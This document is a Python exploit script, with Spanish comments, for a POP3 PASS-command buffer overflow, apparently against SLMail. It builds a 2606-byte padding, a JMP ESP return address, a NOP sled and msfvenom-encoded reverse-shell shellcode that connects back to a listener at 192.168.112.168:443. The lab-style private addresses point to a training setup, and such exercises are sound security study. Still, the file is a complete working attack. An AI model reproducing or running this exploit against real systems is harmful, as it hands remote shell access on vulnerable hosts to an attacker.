#!/usr/bin/python

import socket, sys
from struct import pack

def explotacion():
    
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.112.168 LPORT=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
    
    shellcode=("\xda\xce\xd9\x74\x24\xf4\x5e\xbf\x02\x9c\xb7\x1c\x2b\xc9\xb1"
                "\x52\x31\x7e\x17\x83\xee\xfc\x03\x7c\x8f\x55\xe9\x7c\x47\x1b"
                "\x12\x7c\x98\x7c\x9a\x99\xa9\xbc\xf8\xea\x9a\x0c\x8a\xbe\x16"
                "\xe6\xde\x2a\xac\x8a\xf6\x5d\x05\x20\x21\x50\x96\x19\x11\xf3"
                "\x14\x60\x46\xd3\x25\xab\x9b\x12\x61\xd6\x56\x46\x3a\x9c\xc5"
                "\x76\x4f\xe8\xd5\xfd\x03\xfc\x5d\xe2\xd4\xff\x4c\xb5\x6f\xa6"
                "\x4e\x34\xa3\xd2\xc6\x2e\xa0\xdf\x91\xc5\x12\xab\x23\x0f\x6b"
                "\x54\x8f\x6e\x43\xa7\xd1\xb7\x64\x58\xa4\xc1\x96\xe5\xbf\x16"
                "\xe4\x31\x35\x8c\x4e\xb1\xed\x68\x6e\x16\x6b\xfb\x7c\xd3\xff"
                "\xa3\x60\xe2\x2c\xd8\x9d\x6f\xd3\x0e\x14\x2b\xf0\x8a\x7c\xef"
                "\x99\x8b\xd8\x5e\xa5\xcb\x82\x3f\x03\x80\x2f\x2b\x3e\xcb\x27"
                "\x98\x73\xf3\xb7\xb6\x04\x80\x85\x19\xbf\x0e\xa6\xd2\x19\xc9"
                "\xc9\xc8\xde\x45\x34\xf3\x1e\x4c\xf3\xa7\x4e\xe6\xd2\xc7\x04"
                "\xf6\xdb\x1d\x8a\xa6\x73\xce\x6b\x16\x34\xbe\x03\x7c\xbb\xe1"
                "\x34\x7f\x11\x8a\xdf\x7a\xf2\x75\xb7\xf4\xaa\x1e\xca\xf4\xab"
                "\x65\x43\x12\xc1\x89\x02\x8d\x7e\x33\x0f\x45\x1e\xbc\x85\x20"
                "\x20\x36\x2a\xd5\xef\xbf\x47\xc5\x98\x4f\x12\xb7\x0f\x4f\x88"
                "\xdf\xcc\xc2\x57\x1f\x9a\xfe\xcf\x48\xcb\x31\x06\x1c\xe1\x68"
                "\xb0\x02\xf8\xed\xfb\x86\x27\xce\x02\x07\xa5\x6a\x21\x17\x73"
                "\x72\x6d\x43\x2b\x25\x3b\x3d\x8d\x9f\x8d\x97\x47\x73\x44\x7f"
                "\x11\xbf\x57\xf9\x1e\xea\x21\xe5\xaf\x43\x74\x1a\x1f\x04\x70"
                "\x63\x7d\xb4\x7f\xbe\xc5\xc4\x35\xe2\x6c\x4d\x90\x77\x2d\x10"
                "\x23\xa2\x72\x2d\xa0\x46\x0b\xca\xb8\x23\x0e\x96\x7e\xd8\x62"
                "\x87\xea\xde\xd1\xa8\x3e")
    
    offset=2606
    buffer="A"*offset
    #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    #jmp ESP
    #copiar oppcode
    #buscar en una dll del programa
    #!mona modules
    #tiene que tener las protecciones todo false
    #!mona find -s "\xff\xe4" -m slmfc.dll
    #ver que la direccion no tenga un badchar y copiar cualquiera
    buffer+=pack("<L",0x5f4b41e3)
    buffer+="\x90"*20
    buffer+=shellcode
    
    try:
            
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',110))
        data = s.recv(1024)
        s.send("USER chris \r\n")
        data = s.recv(1024)
        s.send('PASS %s \r\n' % buffer)
        data = s.recv(1024)
    except:
        print("\n[!] Ha habido un error de conexion\n")
        sys.exit(1)
    

        


if __name__ == "__main__":
    explotacion()